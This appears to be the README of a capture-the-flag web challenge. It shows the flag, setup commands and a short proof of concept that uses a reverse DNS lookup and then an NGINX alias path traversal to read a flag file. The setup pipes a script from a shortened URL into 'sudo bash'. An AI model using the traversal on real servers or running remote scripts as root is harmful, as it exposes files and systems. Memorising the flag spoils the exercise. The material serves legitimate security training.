# Uptime Resolver

> Difficulty: Medium </br>
> Category: Web </br>
> FLAG: **YASCON{ReverseDnsLookup-d7ad0997540209cbe09e7db4ab4ceb2f}** </br>

## Setup

```bash
$ curl -Ls https://git.io/JUFEA | sudo bash # turning off default DNS Listener
0x01 $ bash setupdns.sh -c
0x01 $ docker-compose up -d
```

## Challenge PoC

> Reverse DNS Lookup  --> NGINX Alias Path Traversal via Misconfiguration

```bash
$ dig @public-ip -x public-ip # get PTR
$ echo "uptime-dash.yascon.local public-ip" >> /etc/hosts
$ curl http://uptime-dash.yascon.local
$ curl --path-as-is http://uptime-dash.yascon.local/static../.flag.txt # FLAG!!!
```
<!-- v1dhun 29/09/2020 -->